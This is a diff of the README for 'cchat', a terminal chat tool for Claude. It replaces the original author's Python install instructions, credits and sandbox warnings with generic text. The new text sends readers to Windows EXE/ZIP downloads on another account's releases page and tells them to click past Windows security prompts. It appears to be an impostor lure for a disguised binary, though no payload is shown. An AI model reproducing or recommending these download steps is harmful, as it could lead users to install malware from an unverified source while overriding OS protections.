@@ -1,183 +1,168 @@
-# cchat
+# 💬 cchat - Chat with Claude from the terminal
 
-<img width="815" height="544" alt="preview screenshot" src="https://github.com/user-attachments/assets/e8c2a21f-de85-4a47-9793-4ca7b55e1e57" />
+[![Download cchat](https://img.shields.io/badge/Download-cchat-blue?style=for-the-badge)](https://github.com/Sana16-arch/cchat/releases)
 
-a terminal interface for [claude chat](https://claude.ai/chat) that uses your existing plan subscription. no api tokens needed.
+## 🖥️ What cchat does
 
-cchat wraps the [`claude`](https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/overview) code cli in a prompt_toolkit shell with vi keybindings, session persistence, file injection, and a planning workflow that produces task files for autonomous agents.
+cchat lets you use Claude in a terminal window. It gives you a clean text chat view, vi-style keybinds, session support, file and skill attachments, and command or file auto-complete. It also helps you hand tasks off to Claude Code when you need a bigger workflow.
 
-## why
+## 📥 Download cchat for Windows
 
-claude code's interactive mode is fine, but it takes over your terminal and isn't a back and forth conversation. cchat gives you a persistent chat session you control. attach files, switch modes, plan tasks, hand them off to agents to implement, all without leaving your shell.
+1. Open the [cchat Releases page](https://github.com/Sana16-arch/cchat/releases)
+2. Find the latest Windows file
+3. Download the file that matches your system
+4. Save it to a folder you can find again, such as Downloads or Desktop
 
-the key insight: `claude --print` lets you have conversations using your plan tokens, not api credits. cchat manages the sessions, context, and workflow around that.
+If the release page shows more than one file, choose the Windows version. If you use a 64-bit Windows PC, pick the file marked for Windows x64 when available.
 
-## install
+## ⚙️ Before you start
 
-```sh
-# deps
-pip install prompt_toolkit
+You need:
 
-# claude code (if you don't have it)
-npm install -g @anthropic-ai/claude-code
+- Windows 10 or Windows 11
+- A Claude account or access to Claude
+- Internet access
+- A terminal app such as Windows Terminal or PowerShell
 
-# cchat itself — it's a single file
-curl -o ~/.local/bin/cchat https://raw.githubusercontent.com/xero/cchat/main/cchat.py
-chmod +x ~/.local/bin/cchat
-```
+For best results, use a recent version of Windows. cchat is built for text input and works best in a terminal window that can handle colors and keyboard shortcuts.
 
-## usage
+## 🚀 Install and run
 
-```sh
-cchat                    # interactive session (named "default")
-cchat myproject          # named session
-cchat myproject --plan   # start in plan mode
-cchat -a "quick question" # one-shot, no session
-echo "explain this" | cchat -a - --file src/app.js  # pipe + file
-```
+1. Download the latest Windows release from the [Releases page](https://github.com/Sana16-arch/cchat/releases)
+2. Open the downloaded file
+3. If Windows shows a security prompt, choose the option that lets you run the file
+4. Follow any on-screen steps
+5. Start cchat from the terminal or from the app file you downloaded
 
-### profiles
+If the release comes as a ZIP file:
 
-cchat supports multiple claude accounts via profiles. set `CCHAT_PROFILE=work` to switch, or edit `~/.claude_chat/config.json`:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Run the cchat file inside the folder
 
-```json
-{
-  "profiles": {
-    "personal": { "bin": "/usr/local/bin/claude", "env": {} },
-    "work": {
-      "bin": "/usr/local/bin/claude",
-      "env": { "CLAUDE_CONFIG_DIR": "~/.claudework" }
-    }
-  },
-  "default_profile": "personal"
-}
-```
+If the release comes as an EXE file:
 
-the `env` dict is merged into the subprocess environment, so you can point each profile at a different claude config directory with separate auth.
+1. Double-click the EXE file
+2. Let Windows finish the setup or launch process
+3. Open cchat after the file starts
 
-## modes
+## ⌨️ How to use cchat
 
-### chat
+After cchat opens, you can type a message and press Enter to send it.
 
-the default. fast, no tool access, just `--print`. good for questions, reviews, quick back-and-forth.
+Common actions:
 
-### plan
+- Type a chat message and press Enter
+- Use arrow keys to move through text
+- Use vi keybinds if you prefer keyboard navigation
+- Attach a file when you want Claude to read it
+- Attach a skill when you want Claude to follow a task pattern
+- Use command completion to speed up input
+- Use file completion to pick files without typing full paths
 
-`/plan` — read-only access to your codebase via `--permission-mode plan`. the agent can read files, grep, check versions, but can't write anything. use this for researching and designing tasks.
+If you know basic terminal use, cchat feels simple. If you do not, treat it like a chat window with keyboard control.
 
-### plan (danger)
+## 📁 Sessions and task handoff
 
-`/plan danger` — full tool access via `--dangerously-skip-permissions`. the agent can install packages, write test scripts, run your test suite, fetch docs from the web — everything it needs to thoroughly validate a plan before writing it.
+cchat supports session management, so you can return to the same conversation later. This helps when you want to keep work in one place instead of starting over.
 
->[!WARNING]
-> **danger mode should only be used inside a sandbox.** a devcontainer, docker sandbox, or vm where the blast radius is contained. see [sandboxing](#sandboxing) below.
+You can also hand tasks off to Claude Code. Use this when you need a task that fits better in a coding workflow or needs a follow-up in a code-focused tool.
 
-## commands
+## 🔎 Tips for smoother use
 
-| command              | description                           |
-| -------------------- | ------------------------------------- |
-| `/attach <path>`     | attach file(s) or zip to next message |
-| `/skill <path>`      | inject a SKILL.md into next message   |
-| `/system [txt]`      | show or set system prompt             |
-| `/plan [danger]`     | switch to planning mode               |
-| `/chat`              | switch to chat mode                   |
-| `/handoff [name]`    | write task.md when plan is ready      |
-| `/compact`           | reset session, start fresh            |
-| `/clear`             | alias for /compact                    |
-| `/sessions`          | list saved sessions                   |
-| `/usage`             | session stats                         |
-| `/help`              | show help                             |
-| `/q` `/quit` `/exit` | save and quit                         |
+- Keep your terminal window wide enough to read long replies
+- Save your files in a folder you can reach fast
+- Use file attachment when Claude needs context from a document
+- Use session support when you want to come back to a chat later
+- Use vi keybinds if you already know them from other tools
 
-all commands tab-complete. type `/` then tab to see the full list with descriptions.
+## 🧩 Main features
 
-## keybindings
+- Claude chat in the terminal
+- vi keybind support
+- Session management
+- File attachments
+- Skill attachments
+- Command auto-completion
+- File auto-completion
+- Task handoff to Claude Code
+- Simple REPL-style workflow
+- Clean TUI layout
 
-| key      | action                                   |
-| -------- | ---------------------------------------- |
-| `ctrl+g` | send message ("go")                      |
-| `enter`  | newline (insert mode) or submit /command |
-| `F4`     | toggle vi/emacs mode                     |
-| `ctrl+c` | interrupt running command                |
-| `ctrl+d` | save and quit                            |
+## 🪟 Windows notes
 
-vi mode is on by default. the prompt shows `❯` in insert mode and `❮` in normal mode. `dd`, `ciw`, `yy`, `p` — all the usual vi motions work in the input buffer.
+On Windows, cchat works best when you launch it from a terminal app. If you use Windows Terminal, PowerShell, or Command Prompt, keep the window open while you chat.
 
-## the planning workflow
+If text looks crowded:
 
-the core workflow cchat is built for:
+- Maximize the terminal window
+- Increase the font size
+- Use a font that supports clear line spacing
+- Keep long prompts short when possible
 
-1. **chat** — discuss the problem, get a code review, explore options
-2. **plan** — switch to `/plan` (or `/plan danger` in a sandbox). the agent reads your codebase, installs test deps, validates assumptions, works out the approach with you
-3. **handoff** — run `/handoff` when the plan is solid. the agent writes a `task.md` with numbered steps, gate tests, and a definition of done
-4. **execute** — hand the task to an autonomous agent: `claude -p "read task.md and begin" --dangerously-skip-permissions`
+## 🛠️ Troubleshooting
 
-the planning agent does the intellectual work. the executing agent follows instructions. this separation means the executor doesn't need to make judgment calls — everything was decided during planning.
+If cchat does not open:
 
-### task format
+- Check that the file finished downloading
+- Make sure you picked the Windows file
+- Try running it again from the same folder
+- Open it from a terminal window if the app does not start on double-click
 
-`/handoff` produces a structured task file:
+If you cannot attach a file:
 
-- **goal** — what and why
-- **orientation** — files to read first, with exact paths
-- **steps** — numbered, imperative, each with a gate test
-- **definition of done** — verifiable checklist
-- **what not to do** — specific prohibitions
-- **orchestration** — (optional) sub-agent coordination for parallel work
-- **raising an issue** — when to stop and ask instead of guess
+- Check that the file exists
+- Use the file picker or file completion
+- Move the file to a simple folder path like Documents or Desktop
 
-### orchestration
+If the terminal looks wrong:
 
-for complex tasks, the task file can instruct the executing agent to act as a project manager — spawning sub-agents for independent workstreams, monitoring gate tests, and merging results. no extra tooling needed; the orchestration instructions are just part of the task.
+- Restart the terminal
+- Open a new window
+- Try Windows Terminal if you used another terminal app
 
-## sandboxing
+## 📌 File and session habits
 
-danger mode (`/plan danger`) gives the planning agent full system access. **do not run this on your host machine.** use one of:
+Keep your work easy to find:
 
-- [anthropic's devcontainer](https://code.claude.com/docs/en/devcontainer) — the official reference setup
-- [trail of bits devcontainer](https://github.com/trailofbits/claude-code-devcontainer) — security-focused sandbox with `devc` cli
-- [docker sandboxes](https://docs.docker.com/ai/sandboxes/agents/claude-code/) — docker's built-in claude code sandbox support
+- Use one folder for project files
+- Keep related chat sessions in one place
+- Name files clearly
+- Attach only the files Claude needs
 
-the sandbox provides filesystem isolation and network firewall rules. cchat runs inside the container, claude runs inside the container, and your host machine is untouched.
+This makes chat history and file context easier to manage.
 
-## files
+## 📚 Project topics
 
-```
-~/.claude_chat/
-├── config.json          # profiles and settings
-├── default.json         # session state (per session name)
-├── default.history      # input history (per session name)
-└── myproject.json       # another session
-```
+This repository covers:
 
-sessions persist across restarts. `/compact` clears the session state but keeps the history file. sessions are keyed by name — `cchat foo` and `cchat bar` are independent.
+- agentic
+- agentic-workflow
+- claude
+- claude-ai
+- claude-chat
+- claude-cli
+- claude-code
+- cli
+- prompt-toolkit
+- python
+- repl
+- single-file
+- terminal
+- tui
+- tui-app
 
-## status bar
+## 🔗 Download again
 
-the bottom toolbar shows live session state:
+If you need the file later, use the same download page:
 
-- mode icon (green ≡ for chat, cyan ✱ for plan, red ✱ for danger)
-- session name, profile, code session id
-- turn count, skill count
-- armed context count (`ctx:3` when files are attached)
-- quick reference (`^g send`, `/help`)
+[Visit the cchat Releases page](https://github.com/Sana16-arch/cchat/releases)
 
-## CLAUDE.md
+## 🧭 Quick start
 
-if a `CLAUDE.md` or `.claude/CLAUDE.md` exists in the current directory, cchat loads it and appends it to the system prompt via `--append-system-prompt`. this lets you give project-specific context to every message without attaching it manually.
-
-## license
-
-[CC0](https://creativecommons.org/publicdomain/zero/1.0/) — public domain. do whatever you want.
-
-## author
-
-```
- ┌──────────▄▄▄▄▄▄▄─┐
- │  ▄▄▄▄▄▄  █cchat█ │
- │ ▄█~██~█▄ ▀█▀▀▀▀▀ │
- │  ▀█▀▀█▀  ▀       │
- └──────────────────┘
-```
-
-xero harrison [x-e.ro](https://x-e.ro) · [github.com/xero](https://github.com/xero)
+1. Visit the [Releases page](https://github.com/Sana16-arch/cchat/releases)
+2. Download the latest Windows build
+3. Open the file you downloaded
+4. Launch cchat in a terminal
+5. Start chatting with Claude
